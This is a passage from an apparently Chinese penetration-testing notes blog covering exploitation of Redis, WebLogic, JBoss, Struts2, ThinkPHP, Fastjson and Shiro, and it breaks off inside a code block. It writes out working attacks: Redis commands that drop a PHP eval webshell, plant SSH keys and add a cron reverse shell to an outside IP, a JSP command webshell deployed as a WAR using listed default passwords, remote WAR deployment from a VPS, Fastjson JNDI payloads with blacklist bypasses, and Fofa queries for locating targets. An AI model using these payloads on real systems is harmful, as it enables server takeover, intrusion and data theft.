</p><p>VNC：5900、5901  </p><p>Docker：2375  </p></blockquote></li><li><p>要确定对方是否开启redis服务，可以看是否开启了6379端口</p><p>但是使用者而可能更改了端口服务</p><ul><li><p>端口探测</p><blockquote><p>nmap -v -Pn -p 6379 -sV IP</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230827084813386.png" alt="image-20230827084813386"></p></li></ul></li><li><p>redis常用的指令</p><blockquote><p>redis连接远程服务器</p><p>redis-cli -h host -p port -a password</p><p>set testkey “testvalue” 设置testkey的值为testvalue</p><p>get testkey 获取testkey</p><p>set score 99 设置score的值为99</p><p>incr score 将score的值增加一</p><p>get score  获取score的值</p><p>keys *</p><p>列出所有的Key,注意没有values操作</p><p>config set dir &#x2F;home&#x2F;test 设置工作的目录是&#x2F;home&#x2F;test</p><p>config set dbfilename  redis.rdb 设置备份文件名</p><p>config get dir 检查工作目录是否设置成功</p><p>config get dbfilename 检查备份文件名是否设置成功</p><p>save  进行一次备份操作</p><p>flushall 删除所有的数据</p><p>del key 删除 key的数据</p></blockquote></li><li><p>redis的历史漏洞</p><ul><li><p>redis未授权漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/image-20230827090243781.png" alt="image-20230827090243781"></p></li></ul></li><li><p>漏洞利用</p><ul><li><p>环境搭建</p><blockquote><p>dicker-compose.yml</p></blockquote></li><li><p>也可以使用下面的环境</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/web%E5%9F%BA%E7%A1%80/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%9B%BE__2023-08-27-09-40-49.png" alt="截图__2023-08-27-09-40-49"></p></li><li><p>写webshell</p><p>条件知道根目录</p><p>然后redis的未授权漏洞，我们可以上传我们的php一句话木马</p><p>具体的步骤如下</p><blockquote><p>redis-cli -h host -p port</p><p>config set dir 所知道的根目录路径</p><p>config set dbfilename shell.php</p><p>set x &lt;? @_eval($_POST[‘value’]);?&gt;</p><p>save</p></blockquote></li><li><p>getshell</p><p>我们只需要使用我们上传的路径指定位置，然后使用post传参，相当于得到了他的shell</p></li><li><p>写ssh公钥</p><p>0x00</p><p>先生成ssh密钥</p><blockquote><p>  ssh-keygen -t rsa  </p></blockquote><blockquote><p>  (echo  -e “\n\n”; cat ~&#x2F;.ssh&#x2F;id_rsa.pub; echo -e “\n\n”) &gt; &#x2F;tmp&#x2F;foo.txt  cat &#x2F;tmp&#x2F;foo.txt  | redis-cli -h 122.114.225.148 -p 6379 -x set m  </p></blockquote><p>有很多\n的原因是因为需要把不同的密钥分开</p></li><li><p>写定时任务</p><blockquote><p>  redis-cli -h 122.114.225.148  -p 6379  </p><p>  config set dir &#x2F;var&#x2F;spool&#x2F;cron  </p><p>  config set dbfilename root  </p><p>  set xxx “\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i &gt;&amp;  &#x2F;dev&#x2F;tcp&#x2F;124.71.45.28&#x2F;4433 0&gt;&amp;1\n\n”  </p><p>save</p></blockquote></li></ul></li></ol><h2 id="常见中间件漏洞"><a href="#常见中间件漏洞" class="headerlink" title="常见中间件漏洞"></a>常见中间件漏洞</h2><h3 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h3><ol><li><p>简介</p><p>WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间件，确切的说是一个基于JavaEE架构的中间件，它提供了一个现代轻型开发平台，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p></li><li><p>特性</p><p>默认端口：7001</p><p>Web界面：Error 404–Not Found</p><p>控制后台：<a href="http://ip:端口/console">http://ip:端口/console</a></p><p>注意这个console，他会跳转到登录界面</p></li><li><p>历史漏洞</p><p>Weblogic 10.3.6.0</p><p>Weblogic 12.1.3.0</p><p>Weblogic 12.2.1.1</p><p>Weblogic 12.2.1.2</p><p>Weblogic 12.2.1.3</p><p>Weblogic 14.1.1.0</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829123936456.png" alt="image-20230829123936456"></p></li><li><p>漏洞环境搭建</p><p>我的建议是，使用vulhub里面的环境使用docker-compose搭建</p></li><li><p>漏洞利用</p><ol><li><p>weakPassword</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829124748752.png" alt="image-20230829124748752"></p><blockquote><p>账号：weblogic</p><p>密码：Oracle@123</p></blockquote><blockquote><p><strong>system</strong>&#x2F;<strong>password</strong></p><p><strong>system</strong>&#x2F;Passw0rd</p><p>weblogic&#x2F;weblogic</p><p><strong>admin</strong>&#x2F;<strong>security</strong></p><p>joe&#x2F;<strong>password</strong></p><p>mary&#x2F;<strong>password</strong></p><p><strong>system</strong>&#x2F;<strong>security</strong></p><p>wlcsystem&#x2F;wlcsystem</p><p>wlpisystem&#x2F;wlpisystem</p></blockquote></li><li><p>cmd.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt; &lt;% <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>); <span class="hljs-type">String</span> <span class="hljs-variable">output</span><br><span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-keyword">if</span>(cmd != <span class="hljs-literal">null</span>) &#123; <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-keyword">try</span> &#123; <span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">sI</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(p.getInputStream())); <span class="hljs-keyword">while</span><br>((s = sI.readLine()) != <span class="hljs-literal">null</span>) &#123; output += s +<span class="hljs-string">&quot;\r\n&quot;</span>; &#125; &#125; <span class="hljs-keyword">catch</span>(IOException e) &#123; e.printSta<br><span class="hljs-title function_">ckTrace</span><span class="hljs-params">()</span>; &#125; &#125; out.println(output);%&gt;<br></code></pre></td></tr></table></figure><p>这段脚本的意思，就是创建一个执行环境，我们可以使用命令，他来执行</p></li><li><p>打包war包</p><blockquote><p>jar -cvf cmd.war cmd.jsp</p></blockquote></li><li><p>上传war包</p><p>这里需要使用weakPassword进行登录后台</p><p>部署-&gt;安装-&gt;上载文件-&gt;选择文件-&gt;下一步</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131331186.png" alt="image-20230829131331186"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131348097.png" alt="image-20230829131348097"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131414384.png" alt="image-20230829131414384"></p><p>记得选择.war文件</p><p>下一步，下一步，完成</p><p>但是这里出现了报错</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131632799.png" alt="image-20230829131632799"></p></li><li><p>如果顺利进行</p><p>就可以getshell了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829131820267.png" alt="image-20230829131820267"></p><p>同时也可以使用蚁剑等软件</p></li></ol></li></ol><h2 id="java-开发框架漏洞"><a href="#java-开发框架漏洞" class="headerlink" title="java 开发框架漏洞"></a>java 开发框架漏洞</h2><h3 id="JBOSS漏洞"><a href="#JBOSS漏洞" class="headerlink" title="JBOSS漏洞"></a>JBOSS漏洞</h3><ol><li><p>JBOSS简介</p><p>一个基于J2EE的开放源代码的应用服务器</p><p>JBoss 是一个管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet&#x2F;JSP 的WEB容器，一般与<strong>Tomcat</strong>或<strong>Jetty</strong>绑定使用。Jboss是 <strong>Java EE</strong> 应用服务器（就像Apache是web服务器一样），专门用来运行Java EE程序的</p></li><li><p>JBOSS历史漏洞</p><ul><li><p>访问控制不严格导致的漏洞</p><blockquote><p>JMX Console未授权访问Getshell</p><p>Administration Console 弱口令 Getshell</p><p>CVE-2007-1036 – JMX Console HtmlAdaptor Getshell</p><p>CVE-2010-0738 – JMX控制台安全验证绕过漏洞</p></blockquote></li><li><p>反序列化</p><blockquote><p>CVE-2013-4810 – JBoss EJBInvokerServlet 反序列化漏洞</p><p>CVE-2015-7501 – JBoss JMXInvokerServlet 反序列化漏洞</p><p>CVE-2017-7504 – JBoss 4.x JBossMQ JMS 反序列化漏洞</p><p>CVE-2017-12149 – JBosS AS 6.X 反序列化漏洞</p></blockquote></li></ul></li><li><p>JBOSS漏洞的发现</p><p>只要出现以下的场景就会出现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829174426741.png" alt="image-20230829174426741"></p></li><li><p>JBOSS历史漏洞的利用</p><ol><li><h6 id="JMX-Console-未授权访问漏洞"><a href="#JMX-Console-未授权访问漏洞" class="headerlink" title="JMX Console 未授权访问漏洞"></a>JMX Console 未授权访问漏洞</h6><blockquote><p>Jboss的webUI界面 <a href="http://ip:port/jmx-console">http://ip:port/jmx-console</a> 未授权访问(或默认密码 <strong>admin&#x2F;admin</strong>)，可导致JBoss的部署管理的信息泄露，攻击者也可以直接上传木马获取 webshell</p></blockquote></li><li><p>发现</p><p>由于只用JBOSS搭建的，我们可以试探性的访问</p><blockquote><p><a href="http://xx.xx.xx.xx/jmx-console/">http://xx.xx.xx.xx/jmx-console/</a></p></blockquote><p>看是否存在漏洞，如果访问成功就说明存在罗漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/wps9.png" alt="img"></p></li><li><p>漏洞利用</p><p>原理和weblogic是一致的</p><ul><li><p>远程部署war包</p><blockquote><p>找到 jboss.deployment 选项 (Jboss自带的部署功能）中的</p><p>flavor&#x3D;URL,type&#x3D;DeploymentScanner点进去（通过 url 的方式远程部署）</p><p>也可以直接输入以下URL进入：</p></blockquote><p>也可以输入URL进入</p><blockquote><p><a href="http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deploymen">http://xx.xx.xx.xx:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.deploymen</a></p><p>t:type&#x3D;DeploymentScanner,flavor&#x3D;URL</p></blockquote><p><img src="D:\hexo\source_posts\渗透\漏洞攻击利用.assets\image-20230829175122378.png" alt="image-20230829175122378"></p><p>进入页面后找到void addURL()</p><p>下面是部署远程的war包木马</p><blockquote><p><em>#</em> 打包冰蝎<em>jsp</em>马为<em>war</em>包</p><p>jar -cvf shell.war shell.jsp</p><p><em>#</em> 在<em>vps</em>上启动<em>web</em>服务</p><p>python -m <strong>http</strong>.server</p><p><em># war</em>包下载地址</p><p><strong>http</strong>:&#x2F;&#x2F;vps-IP:8000&#x2F;shell.war</p></blockquote><p>然后后点击Invoke部署</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829175409944.png" alt="image-20230829175409944"></p><p>随后点击 Back to MBean View来到 URLList 中查看 Value 值是否已经部署好，并且为我们的远程war木马地址</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829175542082.png" alt="image-20230829175542082"></p><p>最后点击 Apply Changes 后耐心等待一会儿，然后回到 JMX-Console 目录中</p><p>注意：等待的时间是有点长的</p><p>返回jmx-console 目录找到 jboss.web.deployment 查看是否存在我们部署的war木马</p><p>等到部署成功我们可以使用webshell管理程序</p></li></ul></li></ol></li></ol><h3 id="Struts2漏洞"><a href="#Struts2漏洞" class="headerlink" title="Struts2漏洞"></a>Struts2漏洞</h3><ol><li><p>简介</p><p>Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级</p><p>Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts1和Struts2；Struts2是一个基于</p><p>MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器</p><p>(Controller)来建立模型与视图的数据交互。Struts2是Struts的下一代产品，是在 struts1和WebWork的</p><p>技术基础上进行了合并的全新的Struts2框架。</p></li><li><p>历史漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180143397.png" alt="image-20230829180143397"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180158733.png" alt="image-20230829180158733"></p></li><li><p>历史漏洞原理分析</p><blockquote><p><a href="https://tttang.com/archive/1583">https://tttang.com/archive/1583</a></p><p><a href="https://su18.org/post/struts2-5/">https://su18.org/post/struts2-5/</a></p></blockquote></li><li><p>环境建议使用vulhub</p></li><li><p>漏洞发现</p><p><a href="https://github.com/HatBoy/Struts2-Scan">https://github.com/HatBoy/Struts2-Scan</a></p><p><a href="https://github.com/Guaang/s2-tool">https://github.com/Guaang/s2-tool</a></p><p><a href="https://github.com/shack2/Struts2VulsTools">https://github.com/shack2/Struts2VulsTools</a></p></li><li><p>历史漏洞利用</p></li></ol><h2 id="php开发框架漏洞"><a href="#php开发框架漏洞" class="headerlink" title="php开发框架漏洞"></a>php开发框架漏洞</h2><h3 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h3><ol><li><p>简介</p><p>Thinkphp 是一种开源框架。是一个由国人开发的支持 windows&#x2F;Unix&#x2F;Linux 等服务器环境的轻量级PHP开发框架。很多cms就是基于 thinkphp 二次开发的，所以 thinkphp 出问题的话，会影响很多基于 thinkphp开发的网站。</p></li><li><p>历史漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180720926.png" alt="image-20230829180720926"></p></li><li><p>漏洞发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/weblogic/image-20230829180753344.png" alt="image-20230829180753344"></p><p>这个报错就出现了他的版本信息</p><ul><li><p>使用Fofa</p><blockquote><p>header&#x3D;”thinkphp” &amp;&amp; country!&#x3D;”CN”</p><p>header&#x3D;”thinkphp” &amp;&amp; country!&#x3D;”CN” &amp;&amp; <strong>title</strong>&#x3D;”后台管理”</p><p>header&#x3D;”thinkphp”&amp;&amp;country!&#x3D;”CN” &amp;&amp; <strong>title</strong>&#x3D;”后台管理” &amp;&amp; after&#x3D;”2021-01-01”</p></blockquote></li></ul></li><li><p>漏洞利用</p></li></ol><h2 id="FastJson漏洞"><a href="#FastJson漏洞" class="headerlink" title="FastJson漏洞"></a>FastJson漏洞</h2><ol><li><p>简介</p><p>Fastjson是阿里巴巴公司开源的一款JSON解析器，它可以解析 JSON 格式的字符串，是一个 Java</p><p>库， 支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 Java Bean。</p><p>可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p><p><a href="https://www.runoob.com/w3cnote/fastjson-intro.html">https://www.runoob.com/w3cnote/fastjson-intro.html</a></p></li><li><p>历史漏洞</p><blockquote><p>Fastjson &lt;&#x3D;1.2.24 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.41 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.42 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.43 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.45 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.47 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.62 反序列化远程命令执行漏洞</p><p>Fastjson &lt;&#x3D;1.2.66 反序列化远程命令执行漏洞</p></blockquote><ul><li>FastJson &lt; 1.2.41</li></ul><p>  第一个Fastjson反序列化漏洞爆出后，阿里在1.2.25版本设置了autoTypeSupport属性默认alse，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的的。com.sun.rowset.jdbcRowSetlmpl在1.2.25版本被加入了黑名单，Fastjson有个判断条件判断类名是否以”L”开头、以”;”结尾，是的话就提取出其中的类名在加载进来那么就可以构造如下EXP</p><blockquote><p>{“@type”:”Lcom.sun.rowset.JdbcRowSetImpl;”, “dataSourceName”:”rmi:&#x2F;&#x2F;ip:9999&#x2F;rce_1_2_24_e</p><p>xploit”, “autoCommit”:<strong>true</strong>}</p></blockquote><ul><li><p>FastJson &lt; 1.2.42</p><p>阿里在发现这个绕过漏洞之后做出了类名如果为L开头;结尾的时候就先去掉L和;进行黑名单检验的方法，但是没有考虑到双写或多写的情况，也就是说这种方法只能防御一组L和;，构造exp如下，即双写L和;</p><blockquote><p>{“@type”:”LLcom.sun.rowset.JdbcRowSetImpl;;”, “dataSourceName”:”rmi:&#x2F;&#x2F;x.x.x.x:9999&#x2F;exp”,</p><p>“autoCommit”:<strong>true</strong>}</p></blockquote></li><li><p>FastJson &lt; 1.2.47</p><p>在1.2.47版本及以下的情况下，loadClass中默认cache为true，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.jdbcRowSetlmpl这个类，即可绕过黑名单</p><blockquote><p>{ “a”: { “@type”: “java.lang.Class”, “val”: “com.sun.rowset.JdbcRowSetImpl” }, “b”: {</p><p>“@type”: “com.sun.rowset.JdbcRowSetImpl”, “dataSourceName”: “rmi:&#x2F;&#x2F;ip:9999&#x2F;exp”, “auto</p><p>Commit”: true }}</p></blockquote></li><li><p>FastJson &lt; 1.2.66</p><p>基于黑名单绕过，autoTypeSupport属性为true才能使用，在1.2.25版本之后autoTypeSupport默认为false</p><blockquote><p>{“<strong>@type</strong>“:”org.apache.shiro.jndi.JndiObjectFactory”,”resourceName”:”ldap:&#x2F;&#x2F;ip:1389&#x2F;Calc”}</p><p>{“<strong>@type</strong>“:”br.com.anteros.dbcp.AnterosDBCPConfig”,”metricRegistry”:”ldap:&#x2F;&#x2F;ip:1389&#x2F;Calc”}</p><p>{“<strong>@type</strong>“:”org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup”,”jndiNames”:”ldap:&#x2F;&#x2F;ip:1389&#x2F;Calc”}</p></blockquote></li></ul></li><li><p>漏洞发现</p><ul><li><p>json认识</p><p><a href="https://www.runoob.com/json/json-tutorial.html">https://www.runoob.com/json/json-tutorial.html</a></p></li><li><p>FastJson寻找</p><p>Fastjson的作用是用于对JSON格式的数据进行解析和打包，所以出现Json格式的地方，就有可能使用了Fastjson</p></li><li><p>FastJson报错识别  <strong>必须是一行</strong> ，所以我们需要json格式化的东西</p></li><li><p>FastJson漏洞发现</p><p>原理：java.net.InetAddress 这个类在实例化时会尝试对 example.com 进行域名解析，这时候可以通过 dnslog 的方式得知漏洞是否存在</p><blockquote><p><a href="http://dnslog.cn/">http://dnslog.cn</a></p><p><a href="https://www.callback.red/">https://www.callback.red</a></p><p><a href="https://github.com/AlphabugX/Alphalog">https://github.com/AlphabugX/Alphalog</a></p><p><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a></p><p><a href="https://github.com/lanyi1998/DNSlog-GO">https://github.com/lanyi1998/DNSlog-GO</a></p><p><a href="https://github.com/lijiejie/eyes.sh">https://github.com/lijiejie/eyes.sh</a></p></blockquote><blockquote><p>{</p><p>“name”:{</p><p>“@type”:”java.net.InetAddress”,</p><p>“val”:”mingy.qydzoe.dnslog.cn”</p><p>}</p><p>}</p></blockquote><p>防止被黑名单</p><blockquote><p>{</p><p>“name”:{</p><p>“@type”:”LLjava.net.InetAddress;;”,</p><p>“val”:”mingy.qydzoe.dnslog.cn”</p><p>}</p><p>}</p></blockquote></li></ul></li><li><p>漏洞利用</p></li></ol><h2 id="Shiro漏洞"><a href="#Shiro漏洞" class="headerlink" title="Shiro漏洞"></a>Shiro漏洞</h2><ol><li><p>简介</p><p>Apache Shiro是一种功能强大且易于使用的Java安全框架，它执行身份验证、授权、加密和会话管理，可用于保护任何应用程序的安全。</p><p>Shiro提供了应用程序安全性API来执行以下方面：</p><p>1）身份验证：证明用户身份，通常称为用户”登录”；</p><p>2）授权：访问控制；</p><p>3）密码术：保护或隐藏数据以防窥视；</p><p>4）会话管理：每个用户的时间敏感状态。</p><p>上述四个方面也被称为应用程序安全性的四个基石。</p></li><li><p>漏洞发现</p><ul><li><p>组件识别</p><p>在访问及登录时抓包，如果响应头set-cookie中显示<strong>rememberMe&#x3D;deleteMe</strong>，说明使用了Shiro组</p><p>件</p></li><li><p>漏洞搜索</p><p>通过fofa、zoomeye、shodan这类平台搜索相关特征来发现目标。</p><p>例如fofa的搜索关键词：</p><blockquote><p>header&#x3D;”rememberme&#x3D;deleteMe”</p><p>header&#x3D;”shiroCookie”</p></blockquote></li></ul></li><li><p>历史漏洞</p><ul><li>Shiro-550</li></ul><blockquote><p>CVE-2016-4437 Shiro rememberMe 反序列化远程代码执行漏洞</p></blockquote><p>  Apache Shiro 框架提供了记住密码的功能（RememberMe），关闭浏览器再次访问时无需再登录即</p><p>  可访问。用户登录成功后用户信息会经过加密编码后存储在cookie中。在 Cookie 读取过程中有用</p><p>  AES 对 Cookie 值解密的过程，对于 AES 这类对称加密算法，一旦秘钥泄露加密便形同虚设。若秘钥可控，同时 Cookie 值是由攻击者构造的恶意 Payload，就可以将流程走通，触发危险的 Java 反序列化，从而导致远程命令执行漏洞。</p><p>  shiro 默认使用了CookieRememberMeManager，其处理cookie的流程是：</p><p>  <strong>获取 rememberMe的cookie值–&gt;Base64解码–&gt;AES解密 –&gt;反序列化</strong> 。</p><p>  但是AES加密的密钥Key被硬编码(密钥初始就被定义好不能动态改变的)在代码里，这就意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为 cookie 的 rememberMe 字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。</p><p>  <img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/shiro/image-20230831213910270.png" alt="image-20230831213910270"></p><p>  只要<strong>rememberMe</strong>的<strong>AES</strong>加密密钥泄露，无论<strong>shiro</strong>是什么版本都可能会导致该漏洞的产生。硬编码是将数据直接嵌入到程序或其他可执行对象的源代码中。如果在返回包的 <strong>Set-Cookie</strong> 中存在<strong>rememberMe&#x3D;deleteMe</strong> 字段，那么就可能存在此漏洞。</p><p>  常见的kry值：</p>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span 